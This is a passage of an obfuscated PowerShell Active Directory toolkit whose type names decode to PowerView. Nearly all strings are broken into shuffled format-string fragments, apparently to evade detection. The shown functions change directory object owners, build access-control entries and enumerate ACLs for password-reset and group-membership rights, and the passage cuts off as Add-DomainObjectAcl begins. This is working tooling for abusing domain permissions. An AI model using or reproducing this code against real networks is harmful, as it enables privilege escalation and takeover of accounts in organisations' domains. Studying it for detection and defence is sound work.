                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{2}{8}{7}{5}{3}{1}{6}{9}" -f 'PS','nm','are','nAssig','UseDecl','oreTha','ent','M','dVars','s'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}" -f'ould','cess','Pro','PSSh'}, '')]
    [OutputType({"{1}{3}{4}{2}{0}"-f'rs','PowerVi','Hou','ew.Logo','n'})]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )

    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw ("{8}{1}{7}{0}{4}{2}{3}{9}{6}{5}"-f 'A','o','in','correc','rray is the ','h','ngt','nHours','Log','t le')
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                $HoursArr
            )

            $LogonHours = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $HoursArr[$i]
                $Offset = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')

                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $LogonHours
        }
    }

    Process {
        $Output = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]
        }

        $Output = New-Object PSObject -Property $Output
        $Output.PSObject.TypeNames.Insert(0, ("{6}{0}{5}{1}{3}{2}{4}"-f'werVi','o','o','nH','urs','ew.Log','Po'))
        $Output
    }
}


function New-ADObjectAccessControlEntry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{10}{9}{6}{11}{8}{2}{4}{7}{0}{3}{1}" -f 'angingF','nctions','S','u','t','PS','eSho','ateCh','ProcessFor','s','U','uld'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{3}{1}{2}"-f'PS','d','Process','oul','Sh'}, '')]
    [OutputType({"{5}{4}{0}{7}{1}{2}{6}{3}{8}"-f 'curity','Ac','cessControl.Autho','izationRu','m.Se','Syste','r','.','le'})]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias({"{2}{1}{0}{3}{4}"-f 'tin','s','Di','guis','hedName'}, {"{1}{4}{2}{0}{3}" -f 'u','SamA','co','ntName','c'}, {"{0}{1}" -f 'Nam','e'})]
        [String]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}" -f 'DomainCo','oll','ntr','er'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{0}{2}{1}"-f 'OneL','vel','e'}, {"{2}{0}{1}" -f 'tre','e','Sub'})]
        [String]
        $SearchScope = ("{0}{1}" -f'Sub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet({"{1}{3}{2}{0}"-f 'y','AccessSys','it','temSecur'}, {"{0}{1}{2}"-f 'C','reateChil','d'},{"{0}{1}"-f 'Dele','te'},{"{2}{1}{0}"-f 'Child','ete','Del'},{"{0}{1}{2}" -f'D','eleteT','ree'},{"{2}{1}{0}{3}" -f 'nd','xte','E','edRight'},{"{2}{0}{1}{3}" -f 'c','Al','Generi','l'},{"{3}{1}{0}{2}" -f'ecu','ericEx','te','Gen'},{"{0}{3}{1}{2}"-f'Gener','R','ead','ic'},{"{0}{2}{1}"-f 'G','te','enericWri'},{"{3}{0}{2}{1}"-f 'hil','ren','d','ListC'},{"{0}{1}{2}" -f'ListO','bjec','t'},{"{0}{1}{2}" -f 'Re','a','dControl'},{"{3}{0}{1}{2}"-f 'd','P','roperty','Rea'},{"{1}{0}" -f 'f','Sel'},{"{1}{2}{0}" -f'e','Sync','hroniz'},{"{2}{1}{0}" -f 'eDacl','t','Wri'},{"{0}{1}{2}" -f'WriteO','wn','er'},{"{0}{2}{1}" -f'Wri','rty','tePrope'})]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName="ac`ceSs`RUlE`T`yPE")]
        [ValidateSet({"{1}{0}"-f'w','Allo'}, {"{1}{0}"-f'y','Den'})]
        [String[]]
        $AccessControlType,

        [Parameter(Mandatory = $True, ParameterSetName="AU`D`iTRULET`yPe")]
        [ValidateSet({"{1}{0}" -f 'ess','Succ'}, {"{1}{0}"-f 'ure','Fail'})]
        [String]
        $AuditFlag,

        [Parameter(Mandatory = $False, ParameterSetName="aCCE`sSRU`l`eTyPe")]
        [Parameter(Mandatory = $False, ParameterSetName="audit`RuLEt`YPE")]
        [Parameter(Mandatory = $False, ParameterSetName="objEc`T`guIDLooKUP")]
        [Guid]
        $ObjectType,

        [ValidateSet('All', {"{1}{2}{0}" -f 'n','Child','re'},{"{2}{0}{1}" -f 'n','dents','Desce'},{"{1}{0}"-f 'one','N'},{"{0}{2}{1}{3}" -f 'SelfAnd','ldr','Chi','en'})]
        [String]
        $InheritanceType,

        [Guid]
        $InheritedObjectType
    )

    Begin {
        if ($PrincipalIdentity -notmatch ("{2}{1}{0}" -f'.*','1-','^S-')) {
            $PrincipalSearcherArguments = @{
                ("{0}{1}" -f'Identi','ty') = $PrincipalIdentity
                ("{0}{2}{1}" -f'Pro','erties','p') = ("{0}{4}{3}{2}{1}"-f'di','ectsid',',obj','tinguishedname','s')
            }
            if ($PSBoundParameters[("{2}{1}{3}{0}" -f'Domain','rinci','P','pal')]) { $PrincipalSearcherArguments[("{2}{0}{1}"-f 'a','in','Dom')] = $PrincipalDomain }
            if ($PSBoundParameters[("{1}{2}{0}"-f'rver','S','e')]) { $PrincipalSearcherArguments[("{2}{1}{0}" -f'rver','e','S')] = $Server }
            if ($PSBoundParameters[("{0}{1}{2}" -f'SearchS','cop','e')]) { $PrincipalSearcherArguments[("{1}{0}{2}{3}" -f 'earch','S','Sc','ope')] = $SearchScope }
            if ($PSBoundParameters[("{4}{3}{1}{0}{2}"-f 'i','ageS','ze','ultP','Res')]) { $PrincipalSearcherArguments[("{4}{1}{3}{2}{0}"-f'ze','sultP','i','ageS','Re')] = $ResultPageSize }
            if ($PSBoundParameters[("{2}{1}{3}{0}{4}" -f 'eLi','rv','Se','erTim','mit')]) { $PrincipalSearcherArguments[("{2}{0}{3}{1}"-f 'e','it','S','rverTimeLim')] = $ServerTimeLimit }
            if ($PSBoundParameters[("{2}{0}{1}"-f'b','stone','Tom')]) { $PrincipalSearcherArguments[("{2}{0}{1}" -f 'ombston','e','T')] = $Tombstone }
            if ($PSBoundParameters[("{2}{1}{0}"-f 'tial','den','Cre')]) { $PrincipalSearcherArguments[("{2}{0}{1}" -f'ia','l','Credent')] = $Credential }
            $Principal = Get-DomainObject @PrincipalSearcherArguments
            if (-not $Principal) {
                throw ('Un'+'able'+' '+'to'+' '+'re'+'s'+'olve '+'pr'+'i'+'ncipal:'+' '+"$PrincipalIdentity")
            }
            elseif($Principal.Count -gt 1) {
                throw ("{9}{13}{3}{1}{0}{8}{17}{10}{5}{6}{15}{11}{7}{16}{14}{2}{12}{4}"-f 'n','lIde','is a','ipa','ed','s multiple AD ob','ject',' on','tity ','Pr','e','t only','llow','inc',' ','s, bu','e','match')
            }
            $ObjectSid = $Principal.objectsid
        }
        else {
            $ObjectSid = $PrincipalIdentity
        }

        $ADRight = 0
        foreach($r in $Right) {
            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight

        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq ("{3}{2}{1}{0}{4}" -f'Rul','t','i','Aud','eType')) {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
        else {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
    }
}


function Set-DomainObjectOwner {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{9}{6}{1}{3}{2}{8}{7}{5}{10}" -f 'seShoul','cessF','e','orStat','PSU','n','ro','ha','C','dP','gingFunctions'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}" -f 'u','ldProcess','PSSho'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{4}{3}{0}{2}{1}"-f'ished','me','Na','gu','Distin'}, {"{3}{0}{1}{2}"-f 'amAcco','untN','ame','S'}, {"{1}{0}"-f 'ame','N'})]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'wner','O'})]
        [String]
        $OwnerIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'r','F','ilte'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'DS','A','Path'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}"-f'ler','nControl','ai','Dom'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{0}{2}{1}"-f 'O','l','neLeve'}, {"{0}{2}{1}"-f'Sub','ee','tr'})]
        [String]
        $SearchScope = ("{0}{1}{2}" -f 'Subt','re','e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[("{0}{1}" -f 'D','omain')]) { $SearcherArguments[("{1}{0}" -f'omain','D')] = $Domain }
        if ($PSBoundParameters[("{1}{0}{2}" -f 'APFilte','LD','r')]) { $SearcherArguments[("{2}{1}{0}"-f'ter','PFil','LDA')] = $LDAPFilter }
        if ($PSBoundParameters[("{0}{2}{1}"-f'S','hBase','earc')]) { $SearcherArguments[("{0}{1}{2}"-f'Sear','chB','ase')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}"-f'Ser','ver')]) { $SearcherArguments[("{1}{0}"-f 'r','Serve')] = $Server }
        if ($PSBoundParameters[("{3}{2}{1}{0}"-f 'cope','S','h','Searc')]) { $SearcherArguments[("{1}{0}{2}"-f'c','SearchS','ope')] = $SearchScope }
        if ($PSBoundParameters[("{0}{1}{3}{2}"-f'ResultPa','geS','ze','i')]) { $SearcherArguments[("{0}{2}{1}" -f 'Re','ize','sultPageS')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{0}{2}{1}" -f'rTimeLi','it','m','Serve')]) { $SearcherArguments[("{3}{4}{2}{1}{0}"-f'mit','i','TimeL','S','erver')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}"-f 'To','mbstone')]) { $SearcherArguments[("{2}{1}{0}" -f'tone','s','Tomb')] = $Tombstone }
        if ($PSBoundParameters[("{1}{0}{2}"-f 'ede','Cr','ntial')]) { $SearcherArguments[("{2}{3}{0}{1}"-f 'ia','l','Cred','ent')] = $Credential }

        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($OwnerSid) {
            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
        }
        else {
            Write-Warning ('[S'+'e'+'t-D'+'omain'+'Obj'+'ec'+'tOwner] '+'Err'+'or '+'pars'+'in'+'g '+'own'+'er '+'id'+'en'+'tity '+"'$OwnerIdentity'")
        }
    }

    PROCESS {
        if ($OwnerIdentityReference) {
            $SearcherArguments['Raw'] = $True
            $SearcherArguments[("{1}{0}{2}" -f'entit','Id','y')] = $Identity

            
            $RawObject = Get-DomainObject @SearcherArguments

            ForEach ($Object in $RawObject) {
                try {
                    Write-Verbose ('[S'+'et-Do'+'ma'+'inObj'+'ectO'+'wner]'+' '+'Att'+'empt'+'ing '+'to'+' '+'se'+'t '+'t'+'he '+'owner'+' '+'for'+' '+"'$Identity' "+'t'+'o '+"'$OwnerIdentity'")
                    $Entry = $RawObject.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = ("{1}{0}" -f 'wner','O')
                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning ('[S'+'et-Domai'+'nObje'+'c'+'t'+'O'+'wner] '+'Er'+'ror'+' '+'sett'+'in'+'g '+'own'+'e'+'r: '+"$_")
                }
            }
        }
    }
}


function Get-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}"-f'ces','ouldPro','s','PSSh'}, '')]
    [OutputType({"{2}{1}{0}{3}" -f'w','erVie','Pow','.ACL'})]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{3}{1}{2}"-f'Di','tinguishedN','ame','s'}, {"{1}{2}{0}" -f 'me','SamAcco','untNa'}, {"{0}{1}"-f'Nam','e'})]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias({"{0}{1}"-f 'Ri','ghts'})]
        [ValidateSet('All', {"{1}{3}{2}{0}"-f'rd','R','sswo','esetPa'}, {"{1}{0}{2}{3}"-f'riteM','W','embe','rs'})]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'ilter','F'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'A','DSPath'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{3}{0}{2}"-f'e','omainC','r','ontroll','D'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{0}{1}{2}" -f'OneL','e','vel'}, {"{0}{1}{2}" -f 'Su','btr','ee'})]
        [String]
        $SearchScope = ("{0}{1}{2}"-f 'S','ubt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            ("{0}{1}{2}" -f'Prope','rti','es') = ("{12}{0}{2}{13}{11}{9}{10}{7}{8}{5}{6}{4}{3}{1}" -f'n','sid','ame,ntsecuritydes','ct',',obje','sh','edname','stin','gui',',d','i','ptor','samaccount','cri')
        }

        if ($PSBoundParameters[("{1}{0}"-f'cl','Sa')]) {
            $SearcherArguments[("{3}{0}{1}{2}"-f'ecur','ityMa','sks','S')] = ("{1}{0}"-f 'cl','Sa')
        }
        else {
            $SearcherArguments[("{2}{0}{1}"-f'yMas','ks','Securit')] = ("{1}{0}" -f'cl','Da')
        }
        if ($PSBoundParameters[("{0}{1}" -f'Doma','in')]) { $SearcherArguments[("{1}{0}" -f 'in','Doma')] = $Domain }
        if ($PSBoundParameters[("{2}{0}{1}"-f's','e','SearchBa')]) { $SearcherArguments[("{1}{2}{0}" -f 'e','Se','archBas')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}"-f'Ser','ver')]) { $SearcherArguments[("{1}{0}" -f 'erver','S')] = $Server }
        if ($PSBoundParameters[("{1}{2}{0}" -f'pe','SearchS','co')]) { $SearcherArguments[("{3}{0}{2}{1}"-f 'archSco','e','p','Se')] = $SearchScope }
        if ($PSBoundParameters[("{3}{0}{2}{1}"-f'su','Size','ltPage','Re')]) { $SearcherArguments[("{1}{2}{0}" -f 'ultPageSize','Re','s')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{2}{3}{0}{4}"-f 'imeLim','Se','rv','erT','it')]) { $SearcherArguments[("{3}{4}{0}{2}{1}"-f'L','mit','i','ServerTim','e')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}{2}" -f'T','ombst','one')]) { $SearcherArguments[("{2}{0}{1}"-f 'bsto','ne','Tom')] = $Tombstone }
        if ($PSBoundParameters[("{0}{2}{3}{1}" -f'Cred','al','ent','i')]) { $SearcherArguments[("{2}{1}{0}{3}" -f'ti','den','Cre','al')] = $Credential }
        $Searcher = Get-DomainSearcher @SearcherArguments

        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters[("{1}{0}"-f 'omain','D')]) { $DomainGUIDMapArguments[("{1}{2}{0}" -f 'n','Dom','ai')] = $Domain }
        if ($PSBoundParameters[("{0}{1}" -f 'Serve','r')]) { $DomainGUIDMapArguments[("{0}{1}"-f 'Se','rver')] = $Server }
        if ($PSBoundParameters[("{2}{0}{1}"-f 'sultPageSi','ze','Re')]) { $DomainGUIDMapArguments[("{2}{4}{3}{1}{0}"-f'e','ageSiz','Re','ultP','s')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{2}{4}{0}{1}" -f'm','eLimit','erT','Serv','i')]) { $DomainGUIDMapArguments[("{3}{1}{2}{0}" -f 't','er','verTimeLimi','S')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{3}{0}{1}"-f'ia','l','Cr','edent')]) { $DomainGUIDMapArguments[("{3}{1}{2}{0}" -f 'ial','den','t','Cre')] = $Credential }

        
        if ($PSBoundParameters[("{1}{2}{3}{0}"-f'IDs','Res','ol','veGU')]) {
            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match ("{0}{1}" -f '^S-1-.','*')) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match ((("{3}{0}{4}{1}{2}"-f 'CNItK','D','C)=.*','^(','OUItK')).replacE('ItK','|'))) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[("{0}{1}{2}"-f'Dom','ai','n')]) -and (-not $PSBoundParameters[("{1}{0}{2}{3}"-f'a','SearchB','s','e')])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('[Get-D'+'omainObj'+'ect'+'Acl'+'] '+'Ex'+'tracted'+' '+'d'+'omain '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        $SearcherArguments[("{0}{1}{2}"-f'Dom','a','in')] = $IdentityDomain
                        $Searcher = Get-DomainSearcher @SearcherArguments
                        if (-not $Searcher) {
                            Write-Warning ('[Get-Domai'+'nObj'+'e'+'ctA'+'cl] '+'Un'+'able'+' '+'to'+' '+'ret'+'riev'+'e '+'domain'+' '+'searche'+'r'+' '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[("{2}{0}{1}{3}"-f 'AP','Filt','LD','er')]) {
                Write-Verbose ('[G'+'et-Domai'+'nObje'+'ctAcl'+']'+' '+'U'+'s'+'ing '+'ad'+'d'+'iti'+'onal '+'LDA'+'P '+'fi'+'lter:'+' '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            if ($Filter) {
                $Searcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter) "

            $Results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object[("{1}{3}{0}{2}"-f'escripto','ntse','r','curityd')][0], 0 | ForEach-Object { if ($PSBoundParameters[("{0}{1}" -f'Sa','cl')]) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters[("{0}{2}{3}{1}"-f'Rights','ter','F','il')]) {
                            $GuidFilter = Switch ($RightsFilter) {
                                ("{2}{1}{4}{0}{3}"-f'wo','P','Reset','rd','ass') { ("{2}{6}{3}{4}{1}{5}{0}{7}"-f 'e052','768','0','11d0','-a','-00aa006','0299570-246d-','9') }
                                ("{2}{0}{1}{3}"-f'it','eMember','Wr','s') { ("{3}{2}{5}{1}{0}{4}"-f'e6-','-0d','f9679c','b','11d0-a285-00aa003049e2','0') }
                                Default { ("{1}{7}{2}{4}{6}{3}{0}{5}" -f'000000000','000','-0','000-0000-00','00','0','0-0','00000') }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty ("{2}{1}{0}"-f'N','D','Object') $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty ("{1}{2}{0}" -f 'SID','Ob','ject') $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty ("{1}{0}" -f'DN','Object') $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty ("{1}{2}{0}"-f'tSID','Ob','jec') $ObjectSid
                            $Continue = $True
                        }

                        if ($Continue) {
                            $_ | Add-Member NoteProperty ("{3}{2}{0}{4}{1}"-f 'tiveDi','ctoryRights','c','A','re') ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                
                                $AclProperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match ((("{10}{16}{2}{11}{3}{6}{18}{1}{15}{7}{17}{0}{8}{5}{9}{14}{4}{12}{13}" -f 't','ted','Y','ZI','d','eTy','nher','bj','TypeYeZObjectAc','pe','ObjectT','e','ObjectA','ceType','YeZInherite','O','ype','ec','i')) -rEPlAcE 'YeZ',[ChAr]124)) {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, ("{1}{3}{2}{0}"-f'ACL','PowerVi','w.','e'))
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, ("{1}{2}{0}"-f 'w.ACL','PowerVi','e'))
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose ('[G'+'et-'+'DomainObj'+'e'+'ctAcl'+'] '+'Er'+'r'+'or: '+"$_")
                }
            }
        }
    }
}


function Add-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{4}{2}" -f 'SS','ho','ess','P','uldProc'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}{3}{2}"-f'sting','Di','hedName','uis'}, {"{3}{2}{1}{0}"-f 'me','untNa','co','SamAc'}, {"{0}{1}"-f'Na','me'})]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'er','Filt'})]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}{4}"-f 'ol','Contr','Domai','n','ler'})]
        [String]
        $Server,

